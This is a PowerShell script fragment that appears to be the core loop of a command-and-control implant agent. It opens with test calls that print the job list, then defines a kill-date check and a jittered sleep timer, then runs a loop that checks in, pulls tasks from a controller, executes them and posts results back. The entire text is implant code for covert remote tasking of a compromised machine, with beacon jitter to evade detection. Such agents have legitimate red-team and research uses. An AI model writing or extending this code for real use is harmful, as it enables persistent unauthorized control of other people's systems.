# Display Jobs
Write-Host "Jobs:`n" $Script:Jobs

# Test task procesing
Get-Tasking

# Display Jobs
Write-Host "Jobs:`n" $Script:Jobs + "`n"

# process task and kick off job thread
Process-Taskings

# Display Jobs
Write-Host "Jobs:`n" $Script:Jobs 

# Wait to let job finish
Start-Sleep 3

# Collect job output
Retrieve-Output

# Display Jobs
Write-Host "Jobs:`n" $Script:Jobs

# post back the job result
Post-Response

# Display Jobs
Write-Host "Jobs:`n" $Script:Jobs


### Utility functions

# check if agent is running past kill date
function Check-KillDate {
    try {
        $kill = [DateTime]::Parse($Agent.KillDate)
        $date = [DateTime]::Today
        if ([DateTime]::Compare($kill, $date) -ge 0) {
            return $false
        }
        else {
            return $true
        }
    }
    catch {

    }
}

# get sleep time with jitter
function Get-SleepTime {
    if ($Agent.Jitter -eq 0) {
        return $Agent.Sleep * 1000
    }
    else {
        $high = $Agent.Sleep + ($Agent.Sleep * ($Agent.Jitter * 0.01)) 
        $low = $Agent.Sleep - ($Agent.Sleep * ($Agent.Jitter * 0.01))
        $rand = [System.Random]::New()
        $sleep = $rand.Next($low, $high)
        return $sleep * 1000
    }
}


#### Main loop
# Main agent tasking loop
while ($true) {
    if ($Agent.UUID -eq "") {
        Send-Checkin | Out-Null
        $sleep = Get-SleepTime
        [System.Threading.Thread]::Sleep($sleep)
    }
    else {
        while ($true) {
            if (Check-KillDate) {
                exit
            }
            Get-Tasking | Out-Null
            Process-Taskings | Out-Null
            Retrieve-Output | Out-Null
            Post-Response | Out-Null
            $sleep = Get-SleepTime
            [System.Threading.Thread]::Sleep($sleep)
        }
    }
}
